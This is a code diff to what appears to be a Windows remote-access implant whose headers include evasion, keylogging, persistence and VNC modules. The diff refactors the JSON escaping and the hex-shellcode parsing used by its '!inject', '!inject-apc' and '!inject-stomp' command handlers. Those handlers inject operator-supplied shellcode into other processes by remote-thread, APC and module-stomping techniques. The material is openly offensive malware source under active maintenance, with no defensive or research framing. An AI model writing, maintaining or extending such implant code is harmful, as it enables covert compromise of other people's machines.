@@ -4,6 +4,7 @@
 #include "utils.hpp"
 #include "evasion.hpp"
 #include "injection.hpp"
+#include "ghostcore.hpp"
 #include "keylog.hpp"
 #include "persistence.hpp"
 #include "vnc.hpp"
@@ -129,30 +130,9 @@ static void DebugLog(const std::wstring&) {}
 // =====================================================================
 //  JSON HELPERS
 // =====================================================================
-static std::string JsonEscape(const std::string& s) {
-    std::string out;
-    out.reserve(s.size() + 16);
-    for (unsigned char c : s) {
-        switch (c) {
-            case '"':  out += "\\\""; break;
-            case '\\': out += "\\\\"; break;
-            case '\b': out += "\\b";  break;
-            case '\f': out += "\\f";  break;
-            case '\n': out += "\\n";  break;
-            case '\r': out += "\\r";  break;
-            case '\t': out += "\\t";  break;
-            default:
-                if (c < 0x20) {
-                    char buf[8];
-                    snprintf(buf, sizeof(buf), "\\u%04x", c);
-                    out += buf;
-                } else {
-                    out += static_cast<char>(c);
-                }
-        }
-    }
-    return out;
-}
+// Escaping itself lives in include/ghostcore.hpp so tests/test_core.cpp covers
+// the quote, backslash and control-character cases directly.
+using ghost::JsonEscape;
 
 static std::string JsonGetString(const std::string& json, const std::string& key) {
     std::string needle = "\"" + key + "\"";
@@ -923,13 +903,10 @@ static std::wstring HandleInject(const std::string& args) {
     if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
     DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
     if (!pid) return L"[error: invalid pid]";
-    std::string hexStr = args.substr(sp + 1);
     std::vector<BYTE> sc;
-    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
-        if (hexStr[i] == ' ') { --i; continue; }
-        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
-    }
-    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+    std::string perr;
+    if (!ghost::ParseHexBytes(args.substr(sp + 1), sc, perr))
+        return L"[error: " + std::wstring(perr.begin(), perr.end()) + L"]";
     BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
     return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
               : L"[error: injection failed]";
@@ -940,13 +917,10 @@ static std::wstring HandleInjectApc(const std::string& args) {
     if (sp == std::string::npos) return L"Usage: !inject-apc <pid> <hex bytes...>";
     DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
     if (!pid) return L"[error: invalid pid]";
-    std::string hexStr = args.substr(sp + 1);
     std::vector<BYTE> sc;
-    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
-        if (hexStr[i] == ' ') { --i; continue; }
-        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
-    }
-    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+    std::string perr;
+    if (!ghost::ParseHexBytes(args.substr(sp + 1), sc, perr))
+        return L"[error: " + std::wstring(perr.begin(), perr.end()) + L"]";
     BOOL ok = InjectViaApc(pid, sc.data(), sc.size());
     return ok ? L"[+] APC queued " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
               : L"[error: APC injection failed]";
@@ -977,11 +951,9 @@ static std::wstring HandleInjectStomp(const std::string& args) {
     }
 
     std::vector<BYTE> sc;
-    for (size_t i = 0; i + 1 < rest.size(); i += 2) {
-        if (rest[i] == ' ') { --i; continue; }
-        sc.push_back(static_cast<BYTE>(strtol(rest.substr(i, 2).c_str(), nullptr, 16)));
-    }
-    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+    std::string perr;
+    if (!ghost::ParseHexBytes(rest, sc, perr))
+        return L"[error: " + std::wstring(perr.begin(), perr.end()) + L"]";
 
     BOOL ok = InjectModuleStomp(pid, sc.data(), sc.size(), hostDll.c_str(), nullptr);
     return ok ? L"[+] Stomped " + std::to_wstring(sc.size()) + L" bytes into pid="
